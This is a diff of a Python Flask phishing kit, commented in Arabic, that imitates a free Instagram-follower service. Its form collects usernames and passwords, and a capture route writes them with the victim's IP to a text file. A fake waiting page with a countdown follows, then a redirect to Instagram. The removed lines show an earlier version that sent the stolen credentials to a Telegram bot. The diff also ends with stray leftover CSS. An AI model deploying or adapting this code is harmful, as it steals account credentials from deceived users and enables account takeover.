@@ -1,60 +1,233 @@
 from flask import Flask, request, render_template_string, redirect
-import requests
 import datetime
-import time
-import random
-import re
+import os
 
 app = Flask(__name__)
 app.secret_key = "super_secret_key_2026"
 
-# ------ إعدادات Telegram ------
-TELEGRAM_BOT_TOKEN = "توكن_البوت_هنا"
-TELEGRAM_CHAT_ID = "معرف_الدردشة_هنا"
-
-def send_to_telegram(username, password, ip):
-    try:
-        msg = f"""
-🔥 اختراق جديد | خدمة المتابعين الوهمية
-👤 يوزر: {username}
-🔑 باسورد: {password}
-🌐 IP: {ip}
-📅 الوقت: {datetime.datetime.now()}
-"""
-        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-        data = {"chat_id": TELEGRAM_CHAT_ID, "text": msg}
-        requests.post(url, data=data)
-    except:
-        pass
-
-# ================ صفحة الفيشينغ الرئيسية (خدمة زيادة المتابعين) ================
-
+# ================ صفحة الفيشينغ ================
 PHISHING_PAGE = """
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>خدمة زيادة المتابعين | مجاناً</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: linear-gradient(135deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            direction: rtl;
-        }
-        .card {
-            background: white;
-            border-radius: 24px;
-            padding: 40px 35px;
-            max-width: 420px;
-            width: 100%;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            text-align: center;
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>خدمة زيادة المتابعين | مجاناً</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+    background: linear-gradient(135deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    direction: rtl;
+}
+.card {
+    background: white;
+    border-radius: 24px;
+    padding: 40px 35px;
+    max-width: 420px;
+    width: 100%;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+    text-align: center;
+}
+.card h1 {
+    font-size: 26px;
+    background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    margin-bottom: 8px;
+}
+.card .sub {
+    font-size: 14px;
+    color: #666;
+    margin-bottom: 25px;
+}
+.card .icon {
+    font-size: 60px;
+    margin-bottom: 15px;
+}
+input {
+    width: 100%;
+    padding: 14px;
+    margin: 8px 0;
+    border: 2px solid #ddd;
+    border-radius: 12px;
+    font-size: 15px;
+    transition: 0.3s;
+    background: #fafafa;
+}
+input:focus {
+    border-color: #833ab4;
+    outline: none;
+    background: white;
+}
+button {
+    width: 100%;
+    padding: 15px;
+    margin-top: 15px;
+    background: linear-gradient(45deg, #f09433, #e6683c, #dc2743);
+    border: none;
+    border-radius: 50px;
+    color: white;
+    font-weight: bold;
+    font-size: 18px;
+    cursor: pointer;
+    transition: 0.3s;
+    box-shadow: 0 6px 20px rgba(225, 48, 108, 0.4);
+}
+button:hover {
+    transform: scale(1.02);
+    box-shadow: 0 8px 25px rgba(225, 48, 108, 0.6);
+}
+.note {
+    margin-top: 20px;
+    font-size: 13px;
+    color: #888;
+}
+.note span {
+    color: #e1306c;
+    font-weight: bold;
+}
+.badge {
+    display: inline-block;
+    background: #e1306c;
+    color: white;
+    font-size: 12px;
+    padding: 4px 12px;
+    border-radius: 50px;
+    margin-top: 10px;
+}
+.fake-counter {
+    margin: 15px 0;
+    font-size: 14px;
+    color: #555;
+}
+</style>
+</head>
+<body>
+<div class="card">
+    <div class="icon">🚀</div>
+    <h1>زيادة المتابعين</h1>
+    <p class="sub">احصل على <span>1000+</span> متابع حقيقي خلال 20 دقيقة</p>
+    <div class="badge">✨ متاح الآن مجاناً</div>
+    <div class="fake-counter">👥 <span id="live-counter">1,247</span> مستخدم يستخدمون الخدمة حالياً</div>
+    <form action="/capture" method="POST">
+        <input type="text" name="username" placeholder="📱 أدخل اسم المستخدم" required>
+        <input type="password" name="password" placeholder="🔑 أدخل كلمة المرور" required>
+        <button type="submit">🚀 ابدأ زيادة المتابعين</button>
+    </form>
+    <p class="note">🔒 حسابك آمن معنا • <span>خدمة سريعة وآلية</span></p>
+</div>
+<script>
+setInterval(() => {
+    let counter = document.getElementById('live-counter');
+    let current = parseInt(counter.innerText.replace(/,/g, ''));
+    let change = Math.floor(Math.random() * 5) + 1;
+    let newVal = current + change;
+    counter.innerText = newVal.toLocaleString();
+}, 3000);
+</script>
+</body>
+</html>
+"""
+
+# ================ صفحة الانتظار ================
+WAITING_PAGE = """
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>جاري المعالجة</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+    font-family: 'Segoe UI', sans-serif;
+    background: #f0f2f5;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    text-align: center;
+}
+.box {
+    background: white;
+    padding: 50px 40px;
+    border-radius: 30px;
+    box-shadow: 0 15px 40px rgba(0,0,0,0.1);
+    max-width: 450px;
+}
+.spinner {
+    border: 6px solid #f3f3f3;
+    border-top: 6px solid #e1306c;
+    border-radius: 50%;
+    width: 60px;
+    height: 60px;
+    animation: spin 1s linear infinite;
+    margin: 0 auto 25px;
+}
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+h2 { color: #222; margin-bottom: 10px; }
+p { color: #555; font-size: 16px; }
+.timer { color: #e1306c; font-weight: bold; font-size: 18px; margin-top: 15px; }
+.note { margin-top: 20px; font-size: 14px; color: #999; }
+</style>
+</head>
+<body>
+<div class="box">
+    <div class="spinner"></div>
+    <h2>✅ تم تقديم طلبك</h2>
+    <p>جاري إضافة المتابعين إلى حسابك ...</p>
+    <div class="timer">⏳ 20:00 دقيقة متبقية</div>
+    <p class="note">سيتم إضافة المتابعين تلقائياً خلال 20 دقيقة</p>
+</div>
+<script>
+let timeLeft = 1200;
+const timerEl = document.querySelector('.timer');
+const interval = setInterval(() => {
+    let minutes = Math.floor(timeLeft / 60);
+    let seconds = timeLeft % 60;
+    timerEl.innerText = `⏳ ${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')} دقيقة متبقية`;
+    if (timeLeft <= 0) {
+        clearInterval(interval);
+        timerEl.innerText = '✅ تمت العملية بنجاح!';
+    }
+    timeLeft--;
+}, 1000);
+setTimeout(() => {
+    window.location.href = 'https://www.instagram.com';
+}, 1200000);
+</script>
+</body>
+</html>
+"""
+
+@app.route('/')
+def index():
+    return render_template_string(PHISHING_PAGE)
+
+@app.route('/capture', methods=['POST'])
+def capture():
+    username = request.form.get('username', '')
+    password = request.form.get('password', '')
+    ip = request.remote_addr
+
+    # حفظ البيانات في ملف نصي
+    with open("credentials.txt", "a") as f:
+        f.write(f"{datetime.datetime.now()} | {username} | {password} | {ip}\n")
+
+    return render_template_string(WAITING_PAGE)
+
+if __name__ == '__main__':
+    port = int(os.environ.get("PORT", 5000))
+    print("🔥 خادم زيادة المتابعين الوهمي يعمل على المنفذ:", port)
+    app.run(host='0.0.0.0', port=port)
         }
         .card h1 {
             font-size: 26px;
